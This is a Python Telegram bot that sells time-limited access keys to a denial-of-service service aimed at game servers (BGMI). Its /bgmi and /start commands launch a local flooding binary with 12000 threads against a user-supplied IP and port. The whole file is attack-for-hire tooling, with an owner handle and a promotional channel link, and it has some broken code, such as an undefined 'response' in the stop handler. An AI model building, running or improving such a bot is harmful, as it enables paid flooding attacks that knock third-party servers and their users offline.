import subprocess
import json
import os
import random
import string
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
from telegram import ReplyKeyboardMarkup, KeyboardButton
USER_FILE = "users.json"
KEY_FILE = "keys.json"
flooding_process = None
flooding_command = None
DEFAULT_THREADS = 12000
users = {}
keys = {}

def load_data():
    global users, keys
    users = load_users()
    keys = load_keys()

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def load_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading keys: {e}")
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def generate_key(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def add_time_to_current_date(hours=0, days=0):
    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
    
async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        command = context.args
        if len(command) == 2:
            try:
                time_amount = int(command[0])
                time_unit = command[1].lower()
                if time_unit == 'hours':
                    expiration_date = add_time_to_current_date(hours=time_amount)
                elif time_unit == 'days':
                    expiration_date = add_time_to_current_date(days=time_amount)
                else:
                    raise ValueError("Invalid time unit")
                key = generate_key()
                keys[key] = expiration_date
                save_keys()
                response = f"GENKEY\n {key}\n VALIDITY\n {expiration_date}\n\nENTER YOUR KEY \n/redeem"
            except ValueError:
                response = f"USE COMAND-> /genkey 1 HOURE AND DAYS"
        else:
            response = "USAGE-> /genkey 1 HOURE AND DAYS"
    else:
        response = f"❌ ONLY OWNER CAN USE THIS COMMAND -> @GODxAloneBOY"

    await update.message.reply_text(response)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    command = context.args
    if len(command) == 1:
        key = command[0]
        if key in keys:
            expiration_date = keys[key]
            if user_id in users:
                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            else:
                users[user_id] = expiration_date
            save_users()
            del keys[key]
            save_keys()
            response = f"KEY REDEEM SUCCESSFULLY "
        else:
            response = f"OWNER- @GODxAloneBOY"
    else:
        response = f"USE COMMAND-> /redeem"

    await update.message.reply_text(response)


async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text(" ❌ ACCESS DENIED CONTACT TO OWNER-> @GODxAloneBOY")
        return

    if len(context.args) != 3:
        await update.message.reply_text('USE COMMAND->  /bgmi <IP> <PORT> <DURATION>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = context.args[2]

    flooding_command = ['./alone', target_ip, port, duration, str(DEFAULT_THREADS)]
    await update.message.reply_text(f'🔻ATTACK PENDING🔻 \n\nTARGET-> {target_ip}\nPORT-> {port} \nDURATOIN-> {duration}\n\n GODxCHEATS DDOS')


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process, flooding_command
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("TAP TO COMMANDS-> /alone\n\nOWNER- @GODxAloneBOY")
        return

    if flooding_process is not None:
        await update.message.reply_text('🔻ATTACK PENDING🔻->\n\nTAP TO STOP-> /stop')
        return

    if flooding_command is None:
        await update.message.reply_text('TAP TO CONTINUE -> /alone\n\nOWNER- @GODxAloneBOY')
        return

    flooding_process = subprocess.Popen(flooding_command)
    await update.message.reply_text('🔻 ATTACK STARTED🔻\nJOIN MY CHANNEL\nSEND FEEDBACK TO-> @GODxAloneBOY\n\n https://t.me/+03wLVBPurPk2NWRl')


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global flooding_process
    user_id = str(update.message.from_user.id)

    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
        await update.message.reply_text("TAP TO COMMAND -> /alone\n\nOWNER- @GODxAloneBOY")
        return

    if flooding_process is None:
        await update.message.reply_text('❌ ERROR NO ATTACK AVAILABLE')
        return

    flooding_process.terminate()
    flooding_process = None
    await update.message.reply_text('🔻ATTACK STOPPED🔻\n\nTAP TO START-> /start')
    
    await update.message.reply_text(response)

# Update the alone_command function to include buttons
async def alone_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    # Create buttons
    markup = ReplyKeyboardMarkup(
        [
            "/bgmi" 
            "/start"
            "/stop"
        ],
        resize_keyboard=False
    )
    
    response = (
        "ALL COMMANDS\n\n"
        "/genkey-> GENRAT FOR KEY\n"
        "/redeem-> USE TO REDEEM KEY\n"
        "/bgmi-> ATTACK TARGET SET\n"
        "/start-> FOR START ATTACK \n"
        "/stop-> FOR STOP ATTACK\n\n"
        f"OWNER-> {OWNER_USERNAME}"
    ) # Send message with the keyboard buttons
    await update.message.reply_text(response, reply_markup=markup)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("alone", alone_command))

    load_data()
    application.run_polling()

if __name__ == '__main__':
    main()